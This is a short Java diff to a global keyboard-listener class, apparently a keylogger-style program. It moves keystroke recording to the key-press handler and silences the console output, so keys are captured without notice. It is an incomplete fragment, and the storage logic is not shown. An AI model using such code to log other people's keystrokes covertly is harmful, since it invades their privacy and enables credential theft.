@@ -123,12 +123,13 @@ public class Main implements NativeKeyListener{
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		// TODO Auto-generated method stub
-	    System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
+	    // System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 	}
 
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent e) {
-		System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+		// System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
 		//	System.out.print("\n");
 		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
@@ -136,7 +137,6 @@ public class Main implements NativeKeyListener{
 		//} else {
 		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//}
-		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		}
 
 	@Override
